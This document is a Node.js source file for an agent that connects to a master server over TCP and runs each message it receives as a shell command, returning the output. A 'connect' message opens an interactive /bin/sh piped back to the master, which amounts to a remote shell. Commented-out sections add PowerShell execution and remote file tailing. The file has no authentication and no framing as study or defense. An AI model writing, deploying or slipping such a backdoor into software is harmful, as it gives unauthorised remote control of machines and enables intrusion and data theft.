var	net = require('net'),
	spawn = require('child_process').spawn,
	on_death = require('death'),
	Tail = require('file-tail'),
	events = require('events').EventEmitter,
	Parser = require('jsonparse'),
	p = new Parser(),
	util = require('util'),
	os = require('os'),
	masterServer = 'localhost';

var agent = net.connect({port: 8001, host: masterServer}, function(){
		console.log('connected to master...');
		agent.write('set anonymous true\n');
		agent.write('set response-type JSON\r\n');
		agent.write('join room ' + os.hostname() + '\r\n');
	});

	agent.on('data', function(chunk) {
		p.write(chunk);
		p.onValue = function(json) {
			if(this.stack.length <= 0) {
				agent.emit('json', json);
			}
		}
	});

	agent.on('end', function(){
		console.log('connection ended...');
		//res.write(res.data);
		//res.end();
	});

	agent.on('json', function(data){
		console.log('data:', data);
		//data = JSON.parse(data);
		//data.message = d.toString().split(':')[1].trim();
		console.log('got message: ' + data.message);
		if(data.sender === 'server') return;
		if(/^connect\s+(.*)$/.test(data.message)) {
			var match = /^connect\s+(.*)$/.exec(data.message);
			var child_1, child_2;
			var conn = net.connect({port: 8001, host: masterServer}, function(){
				console.log('created child connection back to master...');
				child_1 = spawn('/bin/sh', [], { stdio: [ 'pipe', 'pipe', 'pipe' ], shell: true });
				conn.write('set anonymous true\n');
				conn.write('set response-type JSON\r\n');
				conn.write('join room lol\r\n');
				console.log(child_1.pid);
				child_1.stdout.pipe(conn);
				child_1.stderr.pipe(conn);
				child_1.on('error', function(err){
					console.log(err);
				});
				child_1.on('close', function(err){
					console.log(err);
				});
				child_1.on('exit', function(code, signal) {
					console.log('child_1 exited:', code, signal);
				});
			});

			/*on_death(function(sig, err){
				console.log('got signal: ' + sig);
				console.log(err);
			});*/

			conn.on('data', function(chunk) {
				p.write(chunk);
				p.onValue = function(json) {
					if(this.stack.length <= 0) {
						conn.emit('json', json);
					}
				}
			});

			conn.on('json', function(d){
				console.log('got command: ' + d.message);
				child_1.stdin.write(d.message + '\n');
				//d.message = "powershell \"" + d.message + "\"";
				/*if(/^exit$/.test(d.message)) {
					console.log('sigint: ' + child_1.pid);
					//process.kill(child_1.pid);
					if(child_2 != null) {
						console.log('killing child_2:');
						child_2.kill('SIGINT');
						child_2 = null;
						conn.write('exiting child_2...');
					}
					else {
						//process.kill(match[1], 'SIGINT');
						console.log('killing child_1:');
						child_1.kill('SIGINT');
						conn.write('exiting child_1...');
						child_1.send('\x03');
						conn.end();
					}
					//child_1.stdin.resume();
					//child_1.send('\x03');
					//child_1.stdin.end();
				}
				else if(/^close$/.test(d.message)) {
					console.log('sigint: ' + child_1.pid);
					//process.kill(child_1.pid);
					if(child_2 != null) {
						console.log('killing child_2:');
						child_2.kill('SIGINT');
						child_2 = null;
					}
					//process.kill(match[1], 'SIGINT');
					console.log('killing child_1:');
					conn.end('exit');
					child_1.kill('SIGINT');
					child_1 = null;
				} else {
					if(/^powershell/i.test(d.message)) {
						var match = /^powershell\s+"(.*)"$/.exec(d.message);
						child_2 = spawn("powershell", [match[1]], {stdio: ['pipe', 'pipe', 1]});
						child_2.stdin.end();
						console.log('spawning child_2 for powershell: ' + child_2.pid);
						child_2.stdout.on('data', function(chunk){
							console.log('child _2 got data: ' + chunk);
							conn.write(chunk);
						});
						child_2.on('error', function(err){
							console.log(err);
						});
						child_2.on('close', function(err){
							console.log(err);
						});

					} else if(/^watch\s+(.*)$/.test(d.message)) {
						var match = /^watch\s+(.*)$/.exec(d.message);
						tail = Tail.startTailing(match[1]);

						conn.write("watching file: " + match[1] + '\n\n');
						tail.on("line", function(data) {
						  console.log(data);
						  conn.write(data + '\n');
						});

						tail.on("error", function(error) {
						  console.log('ERROR: ', error);
						});

						tail.on("tailError", function(error) {
						  console.log('ERROR: ', error);
						});
					} else if(/^unwatch$/.test(d.message)) {
						console.log('stopping file watcher...');
						tail.stop();
						tail = null;
						child_1.stdin.write('cd\n');
					}
					else {
						console.log('running command: ' + d.message);
						//child_1.stdin.resume();
						child_1.stdin.write(d.message + '\n');
						//child_1.stdin.end();
					}
					//child_1.stdin.write(d.message + '\n');
				}*/
			});

			conn.on('end', function(){
				console.log('connection ended...');
			});
			conn.on('close', function(){
				console.log('connection closed...');
			});
			conn.on('error', function(){
				console.log('connection ended with error...');
			});
			return;
		}
		var child = spawn(data.message, [], {shell:true});
		console.log('after ');
		//child.pipe(agent);
		child.stdout.on('data', function(d){
			d = d.toString();
			console.log('data: ' + d);
			agent.write(d);
		});
		child.on('close', function(){
			console.log('close: ' + ':zzz');
			//agent.write('token:' + data.token + ':zzz');
		});
		child.on('error', function(err){
			console.log('error: ' + err);
		});
		child.stderr.on('data', function(d){
			console.log(d.toString());
			//agent.write(d);
		});
		// executes `pwd`
		/*child = exec(d, function (error, stdout, stderr) {
		agent.write(stdout);
		console.log(stdout);
		  if (error !== null) {
			console.log('exec error: ' + error);
		  }
		});
		*/
	});

console.log("waiting for callbacks");
